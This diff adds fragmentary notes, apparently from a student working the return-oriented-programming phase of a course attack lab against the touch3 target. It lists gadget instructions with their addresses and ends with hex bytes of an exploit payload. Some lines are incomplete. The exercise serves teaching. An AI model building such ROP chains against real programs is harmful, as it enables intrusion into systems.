@@ -1,0 +1,25 @@
+popq %rax     # set
+callq <touch3>
+
+
+movq %rsp, %rxx =>
+
+movq %rsp, %rax   #<401a06>
+orb %bl           #<401a2f>
+orb %bl           #<401a2f>
+orb %bl           #<401a2f>
+orb %bl           #<401a2f>
+movq %rax, %rdi   #<4019a2>
+
+
+popq %rax   #<4019ab>
+
+movq %
+
+movq %rsp, %rax
+movq %rax, %rdi
+popq %rax
+
+35 39 62 39 39 37 66 61
+a2 19 40 00 00 00 00 00
+fa 18 40 00 00 00 00 00
